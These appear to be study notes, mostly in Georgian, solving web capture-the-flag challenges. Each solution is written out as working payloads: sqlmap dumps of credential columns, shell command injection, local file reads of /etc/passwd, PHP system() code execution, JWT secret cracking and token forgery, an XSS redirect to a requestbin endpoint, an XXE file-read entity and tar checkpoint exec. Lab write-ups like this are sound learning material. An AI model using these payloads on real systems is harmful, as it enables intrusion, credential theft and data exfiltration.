SQLMAP
Sqlmap -u “url” –dbs -> search for databases
Sqlmap -u “url” -D “Dbname” --tables -> search for tables in Dbname database
Sqlmap -u “url” -D “Dbname” --tables -> search for tables in Dbname database
Sqlmap -u “url” -D “Dbname” -T “Tname” --columns -> search for columns in Tname table of Dbname database
Sqlmap -u “url” -D “Dbname” -T “Tname” -C user,pass –dump -> show columns user, pass
Small-Data-Leak
პრობლემა: სისტემა მოწყვლადია SQL injection კუთხით
url-ს დავუმატოთ /user?id=  გამოგვიტანს Sqlalchemy, ჩამონათვლის სკრიპტებს თუ ვნახავთ შევამჩნევთ რომ პითონის სკრიპტებია მონაცემთა ბაზასთან  ინტერაქციისთვის
Sqlmap გამოყენებით ვნახოთ public მონაცემთა ბაზა, მასში იქნება ცხრილი, რომლის სახელიც იქნება გასაღების პირველი ნახევარი, ცხრილში როდესაც შევალთ ვნახავთ გასაღების მეორე ნახევარს.
Ping-Station
პრობლემა: სისტემა მოწყვლადია Command injection კუთხით. 
ვცადოთ 8.8.8.8;ls -l , შედეგი ფოლდერები და ფაილია, ერთ ერთი flag.
8.8.8.8;cat flag – ნაპოვნია გასაღები
File Inclusion
Local file inclusion -
Remote file inclusion – 
File-crawler
პრობლემა: სისტემა მოწყვლადია LFI მიმართ. 
ინსფექტ ელემენტით ვნახავთ რომ IMG სკრიპტი მიგვანიშნებს Local file inclusion-ზე, 
url -ში ჩავუმატოთ, local?image_name=///etc/passwd, გავხსნათ ტექსტურ ფაილად გადმოტვირთული ფაილი, ვნახავთ სხვადასხვა დირექტორიებს, შემდეგ url  ისევ შევცვალოთ, local?image_name=///tmp/flag, გადმოიტვირთება ჩვენი flag, ფაილად. 
Ultra-crawl
პრობლემა: მოწყვლადია local file inclusion-ს მიმართ
მოვსინჯოთ file:///etc/passwd,  მივიღეთ შიგთავსი, რითიც დადასტურდა რომ პრობლემის LFI პრობლემის წინაშე ნამდვილად ვდგავართ. მოვსინჯოთ, file:///home/ctf/app.py
 ინფუთ ველში, მოცემულია პითონის კოდი, სადაც ჩანს რომ ჰოსტი უნდა იყოს company.tld, burpsuite-გამოყენებით, რექუესთს შევცვლით და მივიღებთ გასაღებს.
Curl -I 34.107.71.117:30896 -ვიგებთ ინფორმაციას საიტის აგებულების შესახებ
curl -X POST -H "Host: company.tld" 34.107.71.117:30896 -curl-ის გამოყენებით შეცვალოთ რექუესთში ჰოსტის მნიშვნელობა. მივიღებთ გასაღებს 
Code execution
მავნე კოდის გაშვება ადგილობრივად, RCE -დისტანციურ სისტემაზე მავნე კოდის გაშვება
Substitute
Curl -i url  -> ვნახოთ რაზეა დაწერილი და ეს არის PHP, დეფაულტ ფაილის სახელია Index.php
მანიპულაცია მოვახდინოთ url-ზე, დავუმატოთ - /?vector=/Admin/e&replace=system('ls -l'), ერთი ზევითა მძიმით ls -l, 
ვნახავთ რომ გვაქვს დირექტორია here_we_dont_have_flag, დავუმატოთ Url-ს - /?vector=/Admin/e&replace=system(‘dir here_we_dont_have_flag’), ისევ დავუმატოთ /?vector=/Admin/e&replace=system(‘cat here_we_dont_have_flag/flag.txt’). მივიღეთ ჩვენი გასაღები.
Proxy
JSON web token გამოიეყენება ინფორმაციის სანდოდ მიმოცვლისათვის, ასევე, ლეგიტიმური ავტორიზაციისათვის.
შედგება Header(Algorythm&TokenType).Payload(Data).Signature(verification).
Under-construction
გავიაროთ რეგისტრაცია, ავტორიზაცია. Inspect-დან JS. სკრიპტში ვიპოვოთ ROLE_ADMIN. შემდეგ local storage შევცვალოთ user-> ROLE_ADMIN- ით. დავარეფრეშოთ საიტი, გამოჩნდება ადმინ პანელი.	
JWT Tool გამოყენებით გავიგებთ secret key. Token ავიღებთ inspect elementidan, 
python3 jwt_tool.py -t http://34.107.71.117:30461/api/app/admin -rc
"token" -C -d ~/rockyou.txt  - letmein
შემდეგ jwt.io , encoded- ჩავსვათ მოცემული ტოკენი, ID გავხადოთ 1, secret key – letmein, ამის შემდეგ ადმინ ღილაკზე დაჭერის დროს რექუესთი burpsuite გამოყენებით რიფითერში შევუცვალოთ x-accesstoken ახალი დაგენერირებული ადმინის ტოკენით და მივიღებთ გასაღებს.
Cross-Site Scripting XSS
Stored xss - მავლენ კოდს ინახავს სერვერზე
Reflected xss -მავნე კოდს უგზავნის მსხვერპლს
Manual-Review
პრობლემა: მოწყვლადია XSS მიმართ
რეგისტაცია, ავტორიზაცია, requestbin- გამოყენებით ვიღებთ გასაღებს. 
<script>window.location.href="requestbin endpoint";</script>
XML External Entity attack (xxe)
შეტევა რომელიც XML მონაცემების დამუშავებაში მდგომარეობს.
Syntax-check
file:///var/www/html/flag
file:///etc/passwd
<?xml version="1.0" encoding="ISO-8859-1"?>
	<!DOCTYPE foo [
	<!ELEMENT foo ANY>
	<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=/var/www/html/flag">
	]>
	<foo>
	 &xxe;
	</foo>
მიღებული გასაღები decoder გადავიყვანოთ base64
Tartarsausage
Inspect ვნახეთ html faili. url chavuweret.
cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="ls -la"
cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec="cat enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/flag"
მივიღეთ ფლეგ
WEBGOAT
აპლიკაცია, რომელიც ორიენტირებულია იპოვოს მოწყვლადობა ჯავაზე დაყრდნობილ აპლიკაციებში.
მისი გამოყენების დროს ძალიან მოწყვლადი ხდები შენც, ამიტომ სასურველია ინტერნეტ კავშირი გაწყვითოთ
Request Forgery
Cross site request forgery (CSRF)- გამოიყენება რომ შემტევმა მომხმარებელს გააკეთებინოს ის რაც მომხმარებლებს არ განუძრახავთ
Server side request forgery (SSRF)- გამოიყენება სერვერიდან რექუესთების გასაგზავნად შემტევის მიერ შერჩეულ დომენზე.
Alien-inclusion
პრობლემა: მოწყვლადია SSRF მიმართ
curl 'http://35.246.134.224:30604/?start=' --data 'start=flag.php'
Pickle
პითონის მოდული რომელიც სერიალიზაციას და დესერიალიზაციას ახდენს მონაცემებზე.
Alfa-cookie
Curl -I ნახვის დროს ვხედავთ რომ ორი ჰეშია, auth_cookie & key, პირველი (bytes.fromhex(‘ ‘) hex value convert to ascii, then xor (_,key),

